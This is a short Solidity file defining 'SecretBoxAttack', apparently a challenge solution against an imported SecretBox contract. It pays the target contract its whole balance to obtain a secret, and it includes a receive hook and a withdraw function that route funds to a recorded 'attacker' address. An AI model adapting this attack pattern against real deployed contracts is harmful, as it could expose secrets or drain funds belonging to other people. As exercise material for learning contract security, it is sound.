// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { SecretBox } from "./SecretBox.sol";

contract SecretBoxAttack {
    address private attacker;

    function getSecret(address secretBoxAddr) external returns (string memory) {
        SecretBox sb = SecretBox(payable(secretBoxAddr));
        secretBoxAddr.call{value: address(this).balance}("");
        return sb.getSecret();
    }

    receive() external payable {
        require(attacker == address(0), "already paid");
        attacker = msg.sender;
    }

    function withdraw() external {
        payable(attacker).transfer(address(this).balance);
    }
}
